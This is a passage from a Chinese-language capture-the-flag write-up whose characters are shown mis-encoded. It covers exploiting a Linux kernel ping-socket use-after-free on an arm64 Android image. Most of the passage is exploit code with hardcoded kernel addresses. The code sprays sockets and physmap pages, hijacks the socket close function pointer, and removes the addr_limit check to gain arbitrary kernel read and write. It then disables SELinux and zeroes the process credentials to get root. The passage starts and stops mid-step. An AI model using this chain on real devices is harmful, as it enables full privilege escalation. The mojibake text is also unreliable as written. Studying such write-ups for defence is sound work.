¸crashã€‚ç„¶åï¼Œä¼šç»§ç»­æ‰§è¡Œ`sock_put(sk)`ï¼Œæ­¤æ—¶`sk->sk_refcnt`ä¸º1ï¼ˆè°ƒè¯•å‘ç°ï¼‰ï¼Œå› æ­¤ä¼šæ‰§è¡Œ`sk_free(sk)`æ“ä½œã€‚è™½ç„¶`sk`å·²é‡Šæ”¾ï¼Œä½†ç”¨æˆ·æ€ä¾ç„¶å¯ä»¥é€šè¿‡å·²æ‰“å¼€çš„socketæ–‡ä»¶æè¿°ç¬¦è®¿é—®`sk`ä¸­çš„æ•°æ®ï¼Œäºæ˜¯äº§ç”Ÿäº†UAFã€‚\n\n[æ¼æ´patch](https://github.com/torvalds/linux/commit/a134f083e79fb4c3d0a925691e732c56911b4326?diff=split) åœ¨åˆ é™¤é“¾è¡¨èŠ‚ç‚¹å’Œé‡Šæ”¾skå‡½æ•°ä¹‹é—´æ–°å¢äº†ä¸€ä¸ªå‡½æ•°`sk_nulls_node_init`ï¼Œå°†`sk->sk_node->pprev`ç½®ä¸º0ï¼Œåˆ™æ— æ³•äºŒæ¬¡è¿›å…¥`if (sk_hashed(sk))`åˆ†æ”¯è§¦å‘UAFã€‚\n\n```c\n/*\t\thlist_nulls_del(&sk->sk_nulls_node);\n\t\tsk_nulls_node_init(&sk->sk_nulls_node);\n\t\tsock_put(sk);\t\t*/\n\nstatic inline void sk_nulls_node_init(struct hlist_nulls_node *node)\n{\n\tnode->pprev = NULL;\n}\n```\n\n\n\n# æ¼æ´åˆ©ç”¨\n\n## æ€»ä½“æ€è·¯\n\nåˆ©ç”¨æ€è·¯åˆ†ä¸ºå¦‚ä¸‹6ä¸ªæ­¥éª¤ï¼š\n\n1ã€**physmap spray**ï¼šåŠ«æŒå‡½æ•°æŒ‡é’ˆ`sk->_sk_common->skc_prot->close`\n\n> - å†…æ ¸æ€å †å†…å­˜ï¼šç”¨æˆ·æ€åˆ›å»ºå¤§é‡socketè¿æ¥ï¼Œåˆ©ç”¨æ¼æ´äº§ç”Ÿkmalloc UAF\n> - ç”¨æˆ·æ€mmapå†…å­˜ï¼šmmapå¤§é‡å†…å­˜ï¼Œå¹¶ä»¥é¡µä¸ºå•ä½è¿›è¡Œæ ‡è®°\n> - ä¸¤è€…åœ¨ç‰©ç†å†…å­˜ä¸­å¯èƒ½å­˜åœ¨é‡å ï¼Œå› æ­¤é‡ç‚¹å˜æˆäº†ï¼Œå¦‚ä½•æ‰¾åˆ°mmap pageä¸socketçš„é‡åˆå‘¢ï¼Ÿ\n> - socketæœ‰ä¸€ä¸ªç‰¹æ®Šçš„ioctl cmdï¼Œå«SIOCGSTAMPNSã€‚å®ƒå°†è¿”å›sk->åç§»0x1D8å¤„çš„å€¼ã€‚äºæ˜¯ï¼Œåªè¦åœ¨mmapæ—¶ä¸ºæ¯ä¸ªPAGEåšç‰¹æ®Šæ ‡è®°ï¼Œä¾¿èƒ½å®šä½åˆ°å“ªäº›mmap pageå’Œsocketä¼šé‡åˆã€‚\n> - è€Œclose(fd)æ—¶ä¼šç”¨åˆ°sk->åç§»0x28å¤„çš„å‡½æ•°æŒ‡é’ˆï¼Œå› æ­¤æ”¹ç›®æ ‡mmap_pageå…¶åç§»0x28å¤„çš„å€¼ï¼Œå°±èƒ½å®ç°å†…æ ¸æ§åˆ¶æµåŠ«æŒäº†ï¼\n\n2ã€**æ”¹è¿›ç¨‹addr_limit**ï¼šä»»æ„å†…æ ¸åœ°å€è¯»å†™\n\n>- kernel_setsockopt()å‡½æ•°ï¼Œæ§åˆ¶è·³è¿‡setfs(oldfs)è¿™è¡Œä»£ç ã€‚\n>- ä½¿ç”¨pipeç³»ç»Ÿè°ƒç”¨ï¼Œå¯¹ä»»æ„å†…æ ¸åœ°å€è¯»å†™\n\n3ã€**å…³é—­selinux**ï¼šåˆ©ç”¨ä»»æ„å†…æ ¸è¯»å†™æ¥å…³é—­selinux\n\n4ã€**è·å–cred/real_credåœ°å€**\n\n> - æ³„éœ²å½“å‰è¿›ç¨‹task_structç»“æ„ä½“çš„åœ°å€\n> - æ ¹æ®cred/real_credåœ¨task_structä¸­çš„åç§»ï¼Œè·å–cred/real_credç»“æ„ä½“çš„åœ°å€\n\n5ã€**è¿›ç¨‹ææƒ**\n\n> - å°†credç»“æ„ä½“ä¸­uid,gid,suid,sgid,euid,egid,fsuid,fsgidå…¨éƒ¨ç½®é›¶\n\n6ã€**ç¨³å®šshell**\n\n## æ­¥éª¤1. physmap spray\n\n- UAF socket spray\n\n  ç”±äºéœ€è¦åˆ›å»ºå¤§é‡socketï¼Œå› æ­¤é¦–å…ˆæ”¹æ‰linux rlimitå¯¹æ‰“å¼€æ–‡ä»¶æ•°é‡çš„é™åˆ¶ï¼Œå³RLIMIT_NOFILEï¼ˆèƒ½æ‰“å¼€çš„æ–‡ä»¶æ•°ç›®ï¼‰ã€‚\n\n  ```c\n  int maximize_fd_limit()\n  {\n  \tstruct rlimit rlim;\n  \tint ret;\n  \t\n  \tret = getrlimit(RLIMIT_NOFILE, &rlim);\n  \t//printf(\"rlim.rlim_cur: 0x%x, rlim.rlim_max:0x%x\\n\",rlim.rlim_cur,rlim.rlim_max);\n  \n  \trlim.rlim_cur = rlim.rlim_max;\n  \tsetrlimit(RLIMIT_NOFILE, &rlim);\n  \n  \tret = getrlimit(RLIMIT_NOFILE, &rlim);\n  \treturn rlim.rlim_cur;\n  }\n  ```\n\n  ç„¶åç”³è¯·socketï¼Œå¹¶è°ƒç”¨ä¸¤æ¬¡connectäº§ç”ŸUAFã€‚éœ€è¦ç»•è¿‡POCä¸­éæ³•åœ°å€è®¿é—®ï¼ˆçœŸå®åœºæ™¯ä¸­æ—¶0x200200ï¼Œæœ¬é¢˜ä¸­æ˜¯0x1360ï¼‰ï¼Œå°†è¯¥åœ°å€åšä¸€æ¬¡æ˜ å°„å³å¯ã€‚\n\n  ```c\n  //global \t\n  #define MAX_VULTRIG_SOCKS_COUNT           4000\n  int   vultrig_socks[MAX_VULTRIG_SOCKS_COUNT];\n  //global \n  \n  \tint i;\t// for-loop\n  \n  \tstruct sockaddr_in addr1;\n  \tstruct sockaddr_in addr2;\n  \tmemset(&addr1,0,sizeof(addr1));\n  \tmemset(&addr2,0,sizeof(addr2));\n  \taddr1.sin_family = AF_INET;\n  \taddr2.sin_family = AF_UNSPEC;\n  \n  \tprintf(\"[+] set RLIMIT_NOFILE\\n\");\n  \tmaximize_fd_limit();\n  \n  \tprintf(\"[+] socket prepare...\\n\");\n  \tfor(i=0; i<MAX_VULTRIG_SOCKS_COUNT; i++)\n  \t{\n  \t\tvultrig_socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);\n  \t\tconnect(vultrig_socks[i], &addr1, sizeof(addr1));\n  \t}\n  \n  \t// avoid error: Unable to handle kernel paging request at virtual address 00001360\n  \tprintf(\"[+] mmap 0x1000-0x2000...\\n\");\n  \tsystem(\"echo 4096 > /proc/sys/vm/mmap_min_addr\");\n  \tvoid* user_mm = mmap((void *)0x1000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE| MAP_FIXED |MAP_ANONYMOUS, -1, 0);\n  \tmemset((char *)user_mm,0x90,0x1000);\n  \n  \tprintf(\"[+] generate vuln sockets...\\n\");\n  \tfor(i=0; i<MAX_VULTRIG_SOCKS_COUNT; i++)\n  \t{\n  \t\tconnect(vultrig_socks[i], &addr2, sizeof(addr2));\n  \t\tconnect(vultrig_socks[i], &addr2, sizeof(addr2));\n  \t}\n  ```\n\n- mmap spray\n\n  è€ƒè™‘åˆ°æ€§èƒ½ï¼Œå°†mmapçš„sizeè®¾ç½®å¾—å°½é‡å¤§ã€‚ç»è¿‡æµ‹è¯•ï¼Œä¸€æ¬¡mmap `150*1024*1024`å¤§å°æ˜¯å¯ä»¥çš„ã€‚\n\n  åº”å½“å¦‚ä½•ç»™mmap_pageåšæ ‡è®°å‘¢ï¼Ÿå–å†³äºä½¿ç”¨socketçš„ä½•ç§ç‰¹æ€§ã€‚\n\n  `struct sock`ç»“æ„ä½“ä¸­æœ‰ä¸€ä¸ªæˆå‘˜`ktime_t sk_stamp`ï¼Œç”¨æˆ·æ€å¯ä»¥é€šè¿‡`struct timespec time;  ioctl(exp_sock, SIOCGSTAMPNS, &time)`è¯»å–åˆ°å®ƒçš„è½¬æ¢ç»“æœã€‚64ä½ç³»ç»Ÿä¸‹è°ƒç”¨è¿‡ç¨‹è§ã€Šsocketçš„inet_ioctlã€‹ç« èŠ‚å†…å®¹ã€‚\n\n  é€šè¿‡åˆ†æé¢˜ç›®çš„Imageé•œåƒï¼Œç¡®å®šsk->sk_stampçš„åç§»æ˜¯0x1D8ã€‚\n\n  ```c\n  __int64 __fastcall sock_get_timestampns(__int64 a1, _QWORD *a2)\n  {\n    __int64 v4; // x0\n    __int64 v5; // x1\n    __int64 result; // x0\n    __int64 real; // x0\n    __int64 v10; // x1\n    __int64 v11; // [xsp+0h] [xbp+0h] BYREF\n    __int64 v12; // [xsp+20h] [xbp+20h] BYREF\n    __int64 v13; // [xsp+28h] [xbp+28h]\n  \n    if ( (*(_QWORD *)(a1 + 200) & 0x80) == 0 )\n      sock_enable_timestamp(a1, 7i64);\n    v4 = ns_to_timespec(*(_QWORD *)(a1 + 0x1D8));\n  ```\n\n  å› æ­¤ï¼Œæˆ‘ä»¬åœ¨mmapçš„æ¯ä¸€ä¸ªmmap_pageä¸­ï¼Œåç§»0x1D8çš„ä½ç½®ï¼Œå†™å…¥ä¸€ä¸ª8å­—èŠ‚çš„magic numberã€‚ä»£ç å¦‚ä¸‹ï¼š\n\n  ```c\n  // global\n  #define PAGE_SIZE\t\t\t  4096\n  #define MAGIC_VALUE \t\t\t  0x4B5F5F4B\n  #define MAX_PHYSMAP_SIZE                  120*1024*1024\n  #define MAX_PHYSMAP_SPRAY_PROCESS         5\n  \n  void* physmap_spray_pages[(MAX_PHYSMAP_SIZE / PAGE_SIZE) * MAX_PHYSMAP_SPRAY_PROCESS];\n  int   physmap_spray_pages_count;\n  // global\n  \n  int physmap_spray_func(){\n  \tvoid* mapped;\n  \tvoid* mapped_page;\n  \tint i,j;\n  \n  \tmemset(physmap_spray_pages,0,sizeof(physmap_spray_pages));\n  \tphysmap_spray_pages_count = 0;\n  \n  \tfor(i = 0; i < MAX_PHYSMAP_SPRAY_PROCESS; i++){\n  \t\tmapped = mmap(NULL, MAX_PHYSMAP_SIZE , PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);\n  \t\tmemset((char *)mapped,0x41,MAX_PHYSMAP_SIZE);\n  \n  \t\tfor(j = 0; j < MAX_PHYSMAP_SIZE/PAGE_SIZE; j++){\n  \t\t\tmapped_page = (void*)((char*)mapped + PAGE_SIZE*j);\n  \t\t\t*(unsigned long *)((char*)mapped_page+0x1D8) = MAGIC_VALUE + physmap_spray_pages_count;\n  \t\t\tphysmap_spray_pages[physmap_spray_pages_count] = mapped_page;\n  \t\t\tphysmap_spray_pages_count++;\n  \t\t}\n  \t}\n  \treturn 0;\n  }\n  ```\n\n- find exploitable socket and mmap_page\n\n  å¯¹æ¯ä¸€ä¸ªsocketï¼Œéå†mmap_pageï¼Œæ‰¾åˆ°timestampä¸€è‡´çš„ä¸¤ä¸ªå¯¹è±¡ã€‚\n\n  ```c\n  int search_exploitable_socket(int* index, void** payload)\n  {\n      struct    timespec time;\n      uint64_t  value;\n      void*     page     =  NULL;\n      int       j        =  0;\n      int       exp_sock = -1;\n      int       got      =  0;\n  \n      do{\n          exp_sock = vultrig_socks[*index];\n          memset(&time, 0, sizeof(time));\n          ioctl(exp_sock, SIOCGSTAMPNS, &time);\n          value = ((uint64_t)time.tv_sec * NSEC_PER_SEC) + time.tv_nsec;\n  \n          for(j = 0; j < physmap_spray_pages_count; j++){\n              page = physmap_spray_pages[j];\n              if(value == *(unsigned long *)((char *)page + 0x1D8)){\n                  printf(\"[*] magic:%p\\n\", value);\n                  got = 1;\n                  *payload = page;\n  \t\t\t\tprintf(\"hit the mmap page : 0x%x\\n\",j);\n                  break;\n              }\n          }\n          *index = *index + 1;\n      }while(!got && *index < MAX_VULTRIG_SOCKS_COUNT);\n  \n      if(got == 0){\n          return -1;\n      }\n      else{\n          return exp_sock;\n      }\n  }\n  \n  \n  //è°ƒç”¨\n  \tint exp_sock,exp_sock_index;\n  \tvoid* payload;\n  \n  \texp_sock_index = 0;\n  \texp_sock = search_exploitable_socket(&exp_sock_index,&payload);\n  \tif(exp_sock == -1){\n  \t\tprintf(\"cannot find target socket\\n\");\n  \t}else{\n  \t\tprintf(\"find it 1!!! exp_sock_index: 0x%x\\n\",exp_sock_index);\n  \t}\n  ```\n\n  \n\n- hijack `sk->sk_prot->close`\n\n  `struct sock`ç»“æ„ä½“ä¸­æœ‰è®¸å¤šå‡½æ•°æŒ‡é’ˆï¼Œå…¶ä¸­`sk->sk_prot->close`åœ¨`close(fd)`æ—¶ä¼šé€šè¿‡`sock_close()` -> `sock_release()` -> `inet_release()`è°ƒç”¨åˆ°ã€‚\n\n  ```c\n  struct sock {\n  \t/*\n  \t * Now struct inet_timewait_sock also uses sock_common, so please just\n  \t * don't add nothing before this first member (__sk_common) --acme\n  \t */\n  \tstruct sock_common\t__sk_common;\n  \t#define sk_prot\t\t\t__sk_common.skc_prot\n  \t//......\n  }\n  \n  struct sock_common {\n  \t//......\n  \tstruct proto\t\t*skc_prot;\n  \t//......\n  }\n  \t\n  struct proto {\n  \tvoid\t\t\t(*close)(struct sock *sk,\n  \t\t\t\t\tlong timeout);\n  \tint\t\t\t(*connect)(struct sock *sk,\n  \t\t\t\t\tstruct sockaddr *uaddr,\n  \t\t\t\t\tint addr_len);\n  \t//.......\n  }\n  ```\n\n  inet_releaseå‡½æ•°ä¸­ï¼Œ`sk->sk_prot->close(sk, timeout)`å¯¹åº”çš„æ±‡ç¼–ä»£ç å¦‚ä¸‹ï¼Œ`sk->sk_prot->close`ä¸­sk_protï¼ˆå³__sk_common.skc_protï¼‰è·ç¦»sockèµ·å§‹åœ°å€çš„åç§»é‡æ˜¯0x28ã€‚ä»è¯¥åœ°å€å–å‡ºçš„å€¼å³close()å‡½æ•°èµ·å§‹åœ°å€ã€‚\n\n  ```assembly\n  ROM:FFFFFFC0003FEA20 loc_FFFFFFC0003FEA20                    ; CODE XREF: inet_release+90â†“j\n  ROM:FFFFFFC0003FEA20                                         ; inet_release+98â†“j\n  ROM:FFFFFFC0003FEA20                 STR             XZR, [X20,#0x20]\n  ROM:FFFFFFC0003FEA24                 MOV             X0, X19\n  ROM:FFFFFFC0003FEA28                 LDR             X2, [X19,#0x28]\n  ROM:FFFFFFC0003FEA2C                 LDR             X2, [X2]\n  ROM:FFFFFFC0003FEA30                 BLR             X2\n  ```\n\n  å› æ­¤ï¼Œä¸Šä¸€æ­¥éª¤æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„socketå’Œmmap_pageä¹‹åï¼Œè¦†ç›–mmap_pageåç§»0x28ä½ç½®å¤„çš„8ä¸ªå­—èŠ‚åœ°å€æŒ‡å‘çš„å†…å®¹ï¼Œå°±èƒ½å®ç°æ§åˆ¶æµåŠ«æŒäº†ï¼\n\nè¯¥æ­¥éª¤çš„æºç å‚è€ƒï¼š[æ­¥éª¤1çš„æºç ](step1.c)\n\nç¼–è¯‘å®Œæˆåï¼Œé€šè¿‡adb pushåˆ°è™šæ‹Ÿæœºä¸­ï¼Œæ‰§è¡Œç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒæˆåŠŸåŠ«æŒpcã€‚\n\n![image-20220918180540313](image-20220918180540313.png?size=600)\n\n\n\n## æ­¥éª¤2. æ”¹è¿›ç¨‹addr_limit\n\n- æ‰©å¤§è¿›ç¨‹addr limitè®¿é—®ç©ºé—´\n\n  ç”¨æˆ·æ€è¿›ç¨‹é™·å…¥å†…æ ¸æ€åï¼Œé€šè¿‡set_fs(KERNEL_DS)å°†æœ¬è¿›ç¨‹å¯è®¿é—®åœ°å€é™åˆ¶è®¾ä¸º0xFFFFFFFFFFFFFFFFï¼Œäºæ˜¯å½“å‰è¿›ç¨‹å¯è®¿é—®åˆ°æ‰€æœ‰è™šæ‹Ÿå†…å­˜åœ°å€ã€‚åœ¨ç›®æ ‡åŠŸèƒ½å®Œæˆåï¼Œé€šè¿‡set_fs(oldfs)å°†é™åˆ¶é‡æ–°è®¾ç½®ä¸ºåŸæ¥çš„å¤§å°ã€‚å®ƒä»¬åœ¨å†…æ ¸ä»£ç ä¸­é€šå¸¸æ˜¯æˆå¯¹å‡ºç°çš„ã€‚\n\n  kernel_setsockopt()å‡½æ•°ï¼ˆ*å‡½æ•°åœ°å€ä¸º0xFFFFFFC00035D788*ï¼‰ä¸­è°ƒç”¨äº†set_fs(KERNEL_DS)ï¼Œå¹¶ä¸”é€šè¿‡é€‚å½“è®¾ç½®å¯„å­˜å™¨å¯ä»¥è·³è¿‡setfs(oldfs)è¿™è¡Œä»£ç ã€‚ã€Šaddr limitè®¿é—®é™åˆ¶ã€‹ç« èŠ‚ä¸­â€œkernel_setsockoptâ€å°èŠ‚ï¼Œè¯¦ç»†è¯´æ˜äº†æœ¬é¢˜çš„åˆ©ç”¨æ–¹æ³•ã€‚\n\n  å‘ç”Ÿæ§åˆ¶æµåŠ«æŒæ—¶ï¼Œx0çš„å€¼ä¸ºsockçš„åœ°å€ï¼Œ[x0,#0x28]å¤„å­˜çš„è¿˜æ˜¯sockåœ°å€ï¼Œæ‰€ä»¥x5ä¹Ÿæ˜¯sockåœ°å€ã€‚å› æ­¤å°†[x5,#0x68]å¤„å­˜ä¸Š0xFFFFFFC00035D7C0ï¼Œç›¸å½“äºç»™mmap_page+0x68å¤„å­˜ä¸Šè¿™ä¸ªå€¼ã€‚\n\n  ```\n  ROM:FFFFFFC00035D7B0                 LDR             X5, [X0,#0x28]\n  ROM:FFFFFFC00035D7B4                 LDR             X5, [X5,#0x68]\n  ROM:FFFFFFC00035D7B8                 BLR             X5\n  ROM:FFFFFFC00035D7BC                 STR             X20, [X19,#8]\n  ROM:FFFFFFC00035D7C0                 LDP             X19, X20, [SP,#var_s10]\n  ```\n\n  åœ¨æ­¥éª¤1æ‰§è¡Œclose(exp_sock)ä¹‹å‰ï¼Œå¸ƒç½®å¥½å°†è¦ä½¿ç”¨åˆ°çš„å€¼ã€‚ä½¿å…¶æ‰§è¡Œkernel_setsockopt()å‡½æ•°ï¼Œå¹¶è·³è¿‡set_fs(oldfs)è¿™ä¸€å¥ã€‚\n\n  ```c\n  \t*(unsigned long *)((char*)payload + 0x290) = 0;\n  \t*(unsigned long *)((char*)payload) = (unsigned long)0xFFFFFFC00035D788;\n  \t*(unsigned long *)((char*)payload + 0x28) = payload;\n  \t*(unsigned long *)((char*)payload + 0x68) = (unsigned long)0xFFFFFFC00035D7C0;\n  \tclose(exp_sock);\n  \tprintf(\"[*] now we can R/W kernel address space like a boss.\\n\");\n  ```\n\n- é€šè¿‡pipeç³»ç»Ÿè°ƒç”¨ï¼Œä»»æ„è¯»å†™å†…æ ¸\n\n  å°è£…ä¸¤ä¸ªå‡½æ•°ï¼Œç”¨æˆ·æ€ç¨‹åºé€šè¿‡è°ƒç”¨å®ƒä»¬ï¼Œå°±èƒ½å®ç°å¯¹ä»»æ„å†…æ ¸åœ°å€çš„è¯»å†™ã€‚\n\n  ```c\n  int kernel_read(void* kernel_addr, unsigned long* value, usigned int len){\n  \tint pipefd[2];\n  \tpipe(pipefd);\n  \twrite(pipe[1],kernel_addr,len);\n  \tread(pipe[0],value,len);\n  \treturn 0;\n  }\n  \n  int kernel_write(void* kernel_addr, unsigned long* value, usigned int len){\n  \tint pipefd[2];\n  \tpipe(pipefd);\n  \twrite(pipe[1],value,len);\n  \tread(pipe[0],kernel_addr,len);\n  \treturn 0;\n  }\n  ```\n\nè¯¥æ­¥éª¤çš„æºç å‚è€ƒï¼š[æ­¥éª¤äºŒçš„æºç ](step2.c)\n\né€‰æ‹©å†…æ ¸æ•°æ®æ®µ0xFFFFFFC000580860ï¼Œå†™å…¥0xdeadbeefdeadbeefï¼Œå¹¶æˆåŠŸè¯»å‡ºã€‚æ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\n\n![image-20220918193452306](image-20220918193452306.png?size=600)\n\n\n\n## æ­¥éª¤3. å…³é—­selinux\n\né€šè¿‡`sel_read_enforce()`å‡½æ•°ï¼Œå¯ä»¥å®šä½åˆ°`selinux_enforcing`çš„åœ°å€ï¼Œä¸º0xFFFFFFC00065399Cã€‚\n\n```\n__int64 __fastcall sel_read_enforce(__int64 a1, __int64 a2, __int64 a3, __int64 a4)\n{\n  int v7; // w0\n  _BYTE v9[16]; // [xsp+30h] [xbp+30h] BYREF\n\n  v7 = scnprintf(v9, 12i64, \"%d\", MEMORY[0xFFFFFFC00065399C]);\n    //0xFFFFFFC00065399Cå³selinux_enforcing\n  return simple_read_from_buffer(a2, a3, a4, v9, v7);\n}\n```\n\né€šè¿‡å¦‚ä¸‹ä»£ç ç‰‡æ®µå®ç°å…³é—­selinuxï¼š\n\n```\n\tunsigned int set_selinux = 0;\n\tkernel_write((void*)0xFFFFFFC00065399C,&set_selinux,4);\n```\n\nè¯¥æ­¥éª¤çš„æºç å‚è€ƒï¼š[æ­¥éª¤ä¸‰çš„æºç ](step3.c)\n\nå…ˆè¯»å–selinux_enforcingçš„å€¼ï¼Œä¸º1ï¼Œè¡¨ç¤ºå¼€å¯äº†selinuxã€‚ç„¶åè®¾ç½®selinux_enforcingä¸º0ï¼Œå¹¶è¯»å–ï¼Œå‘ç°è®¾ç½®æˆåŠŸã€‚æ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\n\n![image-20220918200706532](image-20220918200706532.png?size=600)\n\n\n\n## æ­¥éª¤4. è·å–cred/real_credåœ°å€\n\nä¸ºäº†ç»™å½“å‰è¿›ç¨‹ææƒï¼Œéœ€è¦æ”¹credç»“æ„ä½“çš„ä¿¡æ¯ã€‚å› æ­¤ï¼Œå…ˆè·å–task_structç»“æ„ä½“çš„åœ°å€ï¼Œå†é€šè¿‡åç§»å®šä½åˆ°credçš„å­˜æ”¾åœ°å€ã€‚\n\n- æ³„éœ²[task_structç»“æ„ä½“](https://elixir.bootlin.com/linux/v3.10.108/source/include/linux/sched.h#L1041)çš„åœ°å€\n\n  task_structçš„åœ°å€åœ¨[thread_infoç»“æ„ä½“](https://elixir.bootlin.com/linux/v3.10.108/source/arch/arm64/include/asm/thread_info.h#L46)ä¸­å­˜å‚¨ç€ï¼Œè€Œthread_infoç»“æ„ä½“åœ°å€è·Ÿå†…æ ¸æ ˆåœ°å€æ˜¯ç›¸åŒçš„ã€‚arm64ç³»ç»Ÿä¸Šï¼Œå†…æ ¸æ ˆçš„æœ€å¤§æ·±åº¦ä¸º16Kã€‚`sp&0xFFFFFFFFFFFFC000`å³å¯å¾—åˆ°thread_infoçš„åœ°å€ï¼Œtask_structåœ¨thread_infoç»“æ„ä½“ä¸­çš„åç§»æ˜¯0x10ã€‚\n\n  æœ¬é¢˜Imageä¸­ï¼Œæ‰¾åˆ°å¦‚ä¸‹ä»£ç ç‰‡æ®µï¼Œå¯é€šè¿‡`sp&0xFFFFFFFFFFFFC000`è®¡ç®—å°†task_structçš„åœ°å€å†™åˆ°`X1+0x18`åœ°å€å¤„ã€‚\n\n  ```assembly\n  # mutex_trylockå‡½æ•°\n  ROM:FFFFFFC0004AA518                 MOV             X2, SP\n  ROM:FFFFFFC0004AA51C                 AND             X2, X2, #0xFFFFFFFFFFFFC000\n  ROM:FFFFFFC0004AA520                 LDR             X2, [X2,#0x10]\n  ROM:FFFFFFC0004AA524                 STR             X2, [X1,#0x18]\n  ROM:FFFFFFC0004AA528                 RET\n  ```\n\n  ç”±äºæ§åˆ¶æµåŠ«æŒæ—¶ï¼Œx1å¯„å­˜å™¨ä¸­çš„å€¼ä¸º0ï¼Œå› æ­¤task_structçš„åœ°å€å°†è¢«å†™å…¥0x18åœ°å€å¤„ã€‚\n\n  é‚£ä¹ˆéœ€è¦æå‰mmapå°äº4096çš„åœ°å€ï¼Œè€Œç³»ç»Ÿé€šå¸¸ä¼šç¦æ­¢mmapä½åœ°å€ï¼Œæ‰€ä»¥éœ€è¦æ”¹mmap_min_addrçš„å€¼ï¼Œå°†å…¶æ”¹æˆ0ã€‚é€šè¿‡é€†å‘Imageé•œåƒï¼Œå¯ä»¥æ‰¾åˆ°mmap_min_addrçš„å€¼ä¸º0xFFFFFFC000652148ã€‚\n\n  ```c\n  __int64 mmap_min_addr_handler()\n  {\n    __int64 result; // x0\n  \n    result = proc_doulongvec_minmax();\n    MEMORY[0xFFFFFFC000652148] = 4096i64;\t\t\t// 0xFFFFFFC000652148å°±æ˜¯mmap_min_addrçš„åœ°å€\n    return result;\n  }\n  ```\n\n  è¯»å–task_structåœ°å€çš„ä»£ç å¦‚ä¸‹ï¼š\n\n  ```c\n  \t// set mmap_min_addr\n  \tunsigned long set_mmap_min = 0;\n  \tkernel_write((void*)0xFFFFFFC000652148,&set_mmap_min,8);\n  \tuser_mm = mmap((void*)0x0,PAGE_SIZE,PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE| MAP_FIXED |MAP_ANONYMOUS, -1, 0);\n  \n  \t// leak struct_cred address to 0x18\n  \texp_sock = search_exploitable_socket(&exp_sock_index,&payload);\n  \tif(exp_sock == -1){\n  \t\tprintf(\"cannot find target socket\\n\");\n  \t}else{\n  \t\tprintf(\"find it 2!!! exp_sock_index: 0x%x\\n\",exp_sock_index);\n  \t}\n  \t*(unsigned long *)((char*)payload + 0x290) = 0;\n  \t*(unsigned long *)((char*)payload) = (unsigned long)0xFFFFFFC0004AA518;\n  \t*(unsigned long *)((char*)payload + 0x28) = payload;\n  \tclose(exp_sock);\n  \n  \t// read task_struct address\n  \tvoid* task_struct_addr = 0;\n  \ttask_struct_addr = (void*)*(unsigned long*)((char*)user_mm+0x18);\n  \tprintf(\"task_struct addr is : %p\\n\",task_struct_addr);\n  ```\n\n- æ³„éœ²cred/real_credåœ°å€\n\n  æ ¹æ®cred/real_credåœ¨task_structä¸­çš„åç§»ï¼Œè·å–cred/real_credç»“æ„ä½“çš„åœ°å€ã€‚\n\n  ä¸Šä¸€æ­¥è·å¾—äº†`task_struct task`çš„åœ°å€ï¼Œé€šè¿‡`exit_creds()`å‡½æ•°å¾—çŸ¥task->real_credçš„åç§»æ˜¯0x398ã€‚ï¼ˆ`real_cred` ä¸ `cred` æŒ‡å‘çš„ä½ç½®æ˜¯ç›¸åŒçš„ï¼‰\n\n  ```c\n  // IDAä¼ªä»£ç \n  unsigned int *__fastcall exit_creds(__int64 a1)\n  {\n    unsigned int *v2; // x0\n    unsigned int v3; // w1\n    unsigned int v4; // w1\n    unsigned int *result; // x0\n    unsigned int v6; // w1\n    unsigned int v7; // w1\n  \n    v2 = *(unsigned int **)(a1 + 0x398);\n    *(_QWORD *)(a1 + 0x398) = 0i64;\n    do\n    {\n      v3 = __ldaxr(v2);\n      v4 = v3 - 1;\n    }\n  ...\n  }\n  // Cæºä»£ç \n  void exit_creds(struct task_struct *tsk)\n  {\n  \tstruct cred *cred;\n  \tcred = (struct cred *) tsk->real_cred;\n  \ttsk->real_cred = NULL;\n  \tvalidate_creds(cred);\n  ...\n  }\n  ```\n\n  æ‰€ä»¥ï¼Œé€šè¿‡æˆ‘ä»¬å°è£…çš„å†…æ ¸ä»»æ„åœ°å€è¯»å‡½æ•°ï¼Œreal_credçš„åœ°å€ï¼Œä»£ç ç‰‡æ®µå¦‚ä¸‹\n\n  ```c\n  \tvoid* cred_addr = 0;\n  \tkernel_read((char*)task_struct_addr+0x398,&cred_addr,8);\n  \tprintf(\"cred addr: %p\\n\",cred_addr);\n  ```\n\nè¯¥æ­¥éª¤çš„æºç å‚è€ƒï¼š[æ­¥éª¤å››çš„æºç ](step4.c)\n\nè¿è¡Œç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒæˆåŠŸæ³„éœ²äº†task_structå’Œcredç»“æ„ä½“çš„åœ°å€ã€‚\n\n![image-20220920175812155](image-20220920175812155.png?size=600)\n\n\n\n\n\n## æ­¥éª¤5. è¿›ç¨‹ææƒ\n\nè·å–åˆ°cred/real_credç»“æ„ä½“çš„åœ°å€åï¼Œå‰©ä¸‹çš„äº‹æƒ…å°±å˜å¾—ç®€å•äº†ã€‚\n\n[credç»“æ„ä½“](https://elixir.bootlin.com/linux/v3.10.108/source/include/linux/cred.h#L103)å¦‚ä¸‹ï¼Œå°†`uid,gid,suid,sgid,euid,egid,fsuid,fsgid`å…¨éƒ½æ”¹æˆ0ï¼Œå³å¯å®Œæˆæœ¬è¿›ç¨‹çš„ææƒã€‚\n\n```c\nstruct cred {\n\tatomic_t\tusage;\n#ifdef CONFIG_DEBUG_CREDENTIALS\n\tatomic_t\tsubscribers;\t/* number of processes subscribed */\n\tvoid\t\t*put_addr;\n\tunsigned\tmagic;\n#define CRED_MAGIC\t0x43736564\n#define CRED_MAGIC_DEAD\t0x44656144\n#endif\n\tkuid_t\t\tuid;\t\t/* real UID of the task */\n\tkgid_t\t\tgid;\t\t/* real GID of the task */\n\tkuid_t\t\tsuid;\t\t/* saved UID of the task */\n\tkgid_t\t\tsgid;\t\t/* saved GID of the task */\n\tkuid_t\t\teuid;\t\t/* effective UID of the task */\n\tkgid_t\t\tegid;\t\t/* effective GID of the task */\n\tkuid_t\t\tfsuid;\t\t/* UID for VFS ops */\n\tkgid_t\t\tfsgid;\t\t/* GID for VFS ops */\n\t// ......\n};\n```\n\næœ¬éƒ¨åˆ†ä»£ç 